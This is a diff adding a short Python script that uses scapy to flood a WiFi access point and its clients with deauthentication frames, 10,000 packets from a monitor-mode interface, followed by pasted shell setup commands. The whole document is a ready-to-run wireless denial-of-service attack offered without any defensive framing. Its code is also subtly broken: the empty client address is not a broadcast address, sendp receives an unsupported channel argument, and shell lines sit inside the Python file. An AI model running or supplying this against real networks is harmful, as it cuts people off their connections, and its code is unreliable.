@@ -1,0 +1,28 @@
+from scapy.all import *
+
+# Set the target WiFi access point's MAC address and channel
+ap_mac = 'aa:bb:cc:dd:ee:ff'
+channel = 1
+
+# Set the target client's MAC address (leave blank to deauth all clients)
+client_mac = ''
+
+# Set the deauth reason code (optional)
+reason = 7
+
+# Create a deauth packet
+packet = RadioTap() / Dot11(type=0, subtype=12, addr1=client_mac, addr2=ap_mac, addr3=ap_mac) / Dot11Deauth(reason=reason)
+
+# Send the deauth packet using monitor mode
+sendp(packet, iface='mon0', count=10000, inter=0.1, channel=channel)
+
+
+
+
+
+
+
+
+
+pip install scapy
+iwconfig wlan0 mode monitor
